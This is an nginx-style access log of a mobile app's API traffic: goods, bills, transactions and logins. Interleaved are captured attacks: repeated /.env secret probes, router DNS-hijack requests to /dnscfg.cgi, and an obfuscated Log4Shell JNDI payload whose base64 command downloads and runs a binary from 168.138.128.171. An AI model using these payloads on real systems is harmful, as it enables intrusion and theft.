::ffff:127.0.0.1 - - [31/Aug/2022:02:11:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:15:42 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.1"
::1 - - [31/Aug/2022:02:17:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:17:54 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 603 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:19:53 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:21:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::1 - - [31/Aug/2022:02:24:46 +0000] "GET /api/v1/bills/630eb92ef66eb6d6a87203fe HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:32:30 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [31/Aug/2022:02:37:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:05 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:06 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:17 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:21 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:23 +0000] "GET /api/v1/bills/630ebed7f66eb6d6a872062f HTTP/1.0" 200 418 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:38:42 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:38:44 +0000] "GET /api/v1/bills/630ec222f66eb6d6a8720698 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:40:13 +0000] "GET /api/v1/bills/630ec222f66eb6d6a8720698 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:40:56 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:02:40:56 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:02:46:18 +0000] "POST /dnscfg.cgi?dnsPrimary=128.0.104.18&dnsSecondary=128.0.104.18&dnsDynamic=0&dnsRefresh=1&dnsIfcsList= HTTP/1.0" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0 X-Middleton/1"
::1 - - [31/Aug/2022:02:53:33 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:127.0.0.1 - - [31/Aug/2022:03:07:04 +0000] "GET / HTTP/1.0" 404 139 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::1 - - [31/Aug/2022:03:24:31 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:28:05 +0000] "POST /api/v1/users HTTP/1.0" 200 539 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:28:16 +0000] "POST /api/v1/users/login HTTP/1.0" 200 539 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:28:17 +0000] "GET /api/v1/categories HTTP/1.0" 200 426 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:28:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:28:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:28:30 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:28:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:28:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:29:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:29:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:35:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:35:11 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:35:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:35:13 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:35:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:35:13 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:36:24 +0000] "POST /api/v1/goods HTTP/1.0" 200 354 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:36:24 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:36:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 551 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:36:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 431 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:37:02 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 316 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:37:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:37:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:22 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:29 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 315 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 559 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 559 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:41:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:41:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:12 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 429 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:17 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 317 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 559 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 559 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:25 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 403 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:42:36 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 773 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:42:43 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:43:00 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:43:13 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:49 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:45:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:45:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:46:01 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:46:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:03:46:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:03:46:11 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [31/Aug/2022:04:01:17 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [31/Aug/2022:04:14:31 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:04:14:31 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:04:57:29 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [31/Aug/2022:05:05:04 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:05:05:05 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:05:11:29 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:05:14:20 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:05:14:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:05:43:27 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [31/Aug/2022:05:44:02 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:05:44:03 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:05:44:45 +0000] "POST /dnscfg.cgi?dnsPrimary=128.0.104.18&dnsSecondary=128.0.104.18&dnsDynamic=0&dnsRefresh=1&dnsIfcsList= HTTP/1.0" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0 X-Middleton/1"
::ffff:127.0.0.1 - - [31/Aug/2022:06:43:06 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:06:43:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:07:05:05 +0000] "GET / HTTP/1.0" 404 139 "-" "Go-http-client/1.1"
::1 - - [31/Aug/2022:07:19:14 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:07:39:15 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')"
::1 - - [31/Aug/2022:07:42:57 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:07:42:58 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:07:47:05 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:07:47:15 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:08:04:16 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:08:04:17 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:08:24:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:08:24:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:08:48:10 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [31/Aug/2022:08:48:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::1 - - [31/Aug/2022:09:42:20 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:09:42:21 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:10:04:55 +0000] "POST /api/v1/users HTTP/1.0" 500 251 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:05:12 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:05:14 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:06:58 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 585 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:07 +0000] "GET /api/v1/categories HTTP/1.0" 200 426 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:10:07:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:10:07:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
